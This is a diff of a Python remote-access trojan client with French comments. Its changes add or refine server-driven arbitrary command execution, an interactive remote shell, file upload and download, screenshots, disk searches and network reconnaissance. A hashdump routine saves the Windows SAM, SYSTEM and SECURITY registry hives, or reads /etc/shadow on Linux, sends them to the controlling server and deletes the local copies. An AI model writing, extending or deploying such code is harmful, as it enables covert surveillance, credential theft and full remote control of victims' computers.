@@ -3,21 +3,58 @@ import subprocess
 import io
 import base64
 import platform
-import time
 from PIL import ImageGrab
+from colorama import Fore, Style
 
+def colorama_etoile():
+    return Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "*" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "
+
+
+current_directory = os.getcwd()  # Répertoire de départ du script
+
+# Exécute une commande système et retourne le résultat encodé en base64
 def execute_command(command):
+    global current_directory  # Utilise le répertoire courant global
     try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-        return base64.b64encode(output)
+        if command.startswith("cd"):
+            # Extrait le chemin du répertoire de la commande cd
+            path = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else os.path.expanduser("~")
+            # Change le répertoire courant
+            os.chdir(path)
+            current_directory = os.getcwd()  # Met à jour le répertoire courant
+            return base64.b64encode(f"{colorama_etoile()}Répertoire modifié : {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{current_directory}{Style.RESET_ALL}{Fore.RED}{Style.DIM}".encode())
+        else:
+            # Exécute n'importe quelle autre commande système
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
+            return base64.b64encode(output)
     except Exception as e:
-        error_message = f"Command Error: {e}".encode('utf-8')
+        error_message = f"Erreur dans la commande : {e}".encode('utf-8')
         return base64.b64encode(error_message)
-    
+
+# Détecte le système d'exploitation du client
 def detect_os():
     return platform.system().lower()
 
+# Envoie un fichier au serveur
 def download_file_to_server(sock, file_path):
+    # Vérifie si le fichier existe
+    if not os.path.exists(file_path):
+        print(f"Fichier {file_path} non trouvé.")
+        sock.sendall("FILE_NOT_FOUND".encode())  # Informe le serveur que le fichier n'a pas été trouvé
+        return
+
+    try:
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+            # Envoyer la taille du fichier
+            sock.sendall(str(len(file_data)).encode() + b"\n")
+            sock.sendall(file_data)
+        print(f"Fichier {file_path} envoyé avec succès au serveur.")
+    except Exception as e:
+        print(f"Erreur lors de l'envoi du fichier {file_path}: {e}")
+
+# Variante de la fonction précédente pour l'envoi de fichiers spécifiques au hashdump de Linux
+def download_file_to_server_hashdump(sock, file_path):
     try:
         with open(file_path, 'rb') as file:
             file_data = file.read()
@@ -28,9 +65,9 @@ def download_file_to_server(sock, file_path):
     except FileNotFoundError:
         print(f"Fichier {file_path} non trouvé.")
 
-
+# Réceptionne un fichier envoyé par le serveur
 def upload_file_from_server(sock, file_path):
-    # D'abord, recevoir la taille du fichier
+    # Reçois la taille du fichier
     file_size = int(sock.recv(1024).decode())
     with open(file_path, 'wb') as file:
         remaining = file_size
@@ -40,8 +77,7 @@ def upload_file_from_server(sock, file_path):
             remaining -= len(data)
     print(f"Fichier {file_path} reçu avec succès du serveur.")
 
-
-
+# Ouvre un shell interactif sur le client
 def open_shell(sock):
     while True:
         command = sock.recv(1024).decode()
@@ -53,10 +89,16 @@ def open_shell(sock):
         except Exception as e:
             sock.sendall(str(e).encode())
 
+# Récupère la configuration réseau du client
 def get_ipconfig(sock):
-    output = execute_command("ipconfig")
+    os_type = detect_os() # Détermine le système d'exploitation
+    command = "ipconfig" if os_type == "windows" else "ip a"
+
+    # Exécute la commande appropriée en fonction de l'OS
+    output = execute_command(command)
     sock.sendall(output)
 
+# Prend une capture d'écran et l'envoie au serveur
 def take_screenshot(sock):
     try:
         screenshot = ImageGrab.grab()
@@ -70,7 +112,7 @@ def take_screenshot(sock):
     except Exception as e:
         print(f"Erreur lors de la prise de capture d'écran: {e}")
 
-
+# Recherche des fichiers sur le client et envoie les résultats au serveur
 def search_file(sock, search_query, start_path):
     found_files = []
     try:
@@ -97,56 +139,36 @@ def search_file(sock, search_query, start_path):
         error_message = f"Search Error: {e}".encode('utf-8')
         sock.sendall(base64.b64encode(error_message))
 
-
+# Envoie les données de hashdump au serveur. Pour Windows, cela inclut les fichiers SAM, SYSTEM et SECURITY.
+# Pour Linux, cela inclut le contenu de /etc/shadow.
 def hashdump(sock):
     os_type = detect_os()
-    if os_type == 'windows':
-        files = ["SAM", "SYSTEM"]
-        # Envoyer le nombre de fichiers à transférer
-        sock.sendall(str(len(files)).encode() + b'\n')
-        for file in files:
-            # Enregistrement du fichier dans le système
-            execute_command(f"reg save HKLM\\{file} {file}")
+    sock.sendall(os_type.encode())
 
-            # Envoi du fichier
-            with open(file, 'rb') as f:
-                file_data = f.read()
-                encoded_data = base64.b64encode(file_data)
-                sock.sendall(f"{file},{len(encoded_data)}".encode() + b'\n')
-                sock.sendall(encoded_data)
-                sock.sendall(b"END_OF_FILE")  # Marqueur de fin pour ce fichier
+    if os_type == "windows":
+        # Sauvegarde et envoie les fichiers nécessaires pour le hashdump
+        try:
+            subprocess.run(["reg", "save", "HKLM\\SAM", "sam.save"], check=True)
+            subprocess.run(["reg", "save", "HKLM\\SYSTEM", "system.save"], check=True)
+            subprocess.run(["reg", "save", "HKLM\\SECURITY", "security.save"], check=True)
+            
+            # Utilise la fonction "download_file_to_server" pour envoyer les fichiers au serveur
+            download_file_to_server(sock, "sam.save")
+            download_file_to_server(sock, "system.save")
+            download_file_to_server(sock, "security.save")
+            
+            # Nettoie les fichiers temporaires
+            os.remove("sam.save")
+            os.remove("system.save")
+            os.remove("security.save")
+        except subprocess.CalledProcessError as e:
+            print(f"Erreur Windows hashdump: {e}")
+    elif os_type == "linux":
+        # Linux: Simule l'envoi du fichier /etc/shadow
+        shadow_path = "/etc/shadow"
+        download_file_to_server_hashdump(sock, shadow_path)
 
-            # Suppression du fichier après l'envoi
-            os.remove(file)
-
-    elif os_type == 'linux':
-        file = "/etc/shadow"
-        # Envoyer le nombre de fichiers à transférer
-        sock.sendall(b"1\n")
-        output = execute_command(f"cat {file}")
-        sock.sendall(f"{os.path.basename(file)},{len(output)}".encode() + b'\n')
-        sock.sendall(output)
-        sock.sendall(b"END_OF_FILE")  # Marqueur de fin pour ce fichier
-
-    # Envoyer le signal de fin après avoir traité tous les fichiers
-    sock.sendall(b"END_OF_HASHDUMP")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# Traite les commandes reçues du serveur
 def handle_command(conn, cmd):
     if cmd.startswith("download"):
         file_path = cmd.split(" ", 1)[1]
@@ -166,5 +188,4 @@ def handle_command(conn, cmd):
         start_path = parts[2] if len(parts) == 3 else "C:\\"
         search_file(conn, search_query, start_path)
     elif cmd.startswith("hashdump"):
-        print("[DEBUG - Client] Exécution de la commande hashdump")  # Ajout pour le débogage
         hashdump(conn)
